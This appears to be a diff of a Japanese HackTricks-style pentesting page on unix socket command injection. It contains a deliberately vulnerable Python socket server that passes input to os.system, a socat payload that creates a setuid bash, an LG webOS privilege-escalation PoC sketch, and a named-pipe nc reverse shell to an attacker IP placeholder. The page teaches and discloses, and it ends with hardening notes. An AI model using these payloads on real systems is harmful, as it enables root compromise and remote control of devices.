@@ -1,10 +1,8 @@
 # Socket Command Injection
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## PythonによるSocket bindingの例
 
-以下の例では、**unix socketが作成され**（`/tmp/socket_test.s`）、**受信したすべてのデータ**が`os.system`によって**実行されます**。このようなものを実環境で見つけることはないと思いますが、この例の目的は、unix socketを使用するコードがどのようなものか、そして最悪のケースを想定して入力を処理する方法を確認することです。
+以下の例では、**unix socketが作成され**（`/tmp/socket_test.s`）、**受信したすべてのデータ**が`os.system`によって**実行されます**。実際の環境でこのようなものを見つけることはないと思いますが、この例の目的は、unix socketを使用するコードがどのようなものか、そして最悪のケースを想定して入力をどのように処理するかを確認することです。
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +24,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Pythonでコードを実行**: `python s.py` し、**socketがどのようにlistenしているかを確認**してください：
+**コードを実行**: `python s.py` し、**socket がどのように listen しているか確認**してください：
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -37,17 +35,20 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## ケーススタディ: Root-owned UNIX socketによるsignal-triggered escalation (LG webOS)
+## Case study: root-owned UNIX socket による signal-triggered escalation (LG webOS)
 
-一部の特権daemonは、信頼できない入力を受け付け、特権操作をthread-IDおよびsignalに結び付けるroot-owned UNIX socketを公開しています。protocolによって、権限のないclientが対象となるnative threadを選択できる場合、特権code pathをtriggerしてescalateできる可能性があります。<sup>[[1]](#references)</sup>
+一部の privileged daemon は、untrusted input を受け付け、privileged action と thread-ID および signal を結び付ける root-owned UNIX socket を公開しています。protocol によって unprivileged client が対象となる native thread を指定できる場合、privileged code path を trigger して privilege escalation できる可能性があります。<sup>[[1]](#references)[[2]](#references)</sup>
 
-確認されたパターン:
+主要な write-up と disclosure では、次の sequence が説明されています。<sup>[[1]](#references)[[2]](#references)</sup>
+
+Observed pattern:
 - root-owned socket（例: /tmp/remotelogger）に接続する。
-- threadを作成し、そのnative thread id（TID）を取得する。
-- TID（packed）とpaddingをrequestとして送信し、acknowledgementを受信する。
-- そのTIDに特定のsignalを送信し、特権動作をtriggerする。
+- thread を作成し、その native thread id（TID）を取得する。
+- TID（packed）と padding を request として送信し、acknowledgement を受信する。
+- その TID に specific signal を送信して、privileged behaviour を trigger する。
 
-最小限のPoCスケッチ:
+以下の condensed PoC は、この sequence を再現しています。<sup>[[1]](#references)[[2]](#references)</sup>
+Minimal PoC sketch:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -59,17 +60,17 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-これを root shell にするには、単純な named-pipe + nc パターンを使用できます。
+これを root shell に変えるには、単純な named-pipe + nc パターンを使用できます。<sup>[[2]](#references)</sup>
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-Notes:
-- この種のバグは、権限のないクライアント状態（TIDs）から得た値を信頼し、それらを権限のある signal handlers やロジックに結び付けることで発生します。
-- socket 上で credentials を強制し、message formats を検証し、権限のある操作を外部から提供された thread identifiers から分離することで harden できます。
+注:
+- このクラスのバグは、非特権クライアントの状態（TIDs）から導出された値を信頼し、それらを特権シグナルハンドラやロジックに結び付けることで発生します。<sup>[[1]](#references)</sup>
+- socket に対して credentials を強制し、message format を検証し、特権操作を外部から提供された thread identifier から分離することで harden します。
 
-## 参考文献
+## References
 
-- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
-
+- [1] [楽しみのための webOS Jailbreak（本当に楽しみのため）](https://ut.buglloc.com/2025/01/webos-jailbreak/)
+- [2] [LG WebOS TV の Path Traversal、Authentication Bypass、Full Device Takeover（SSD Disclosure）](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 {{#include ../../banners/hacktricks-training.md}}
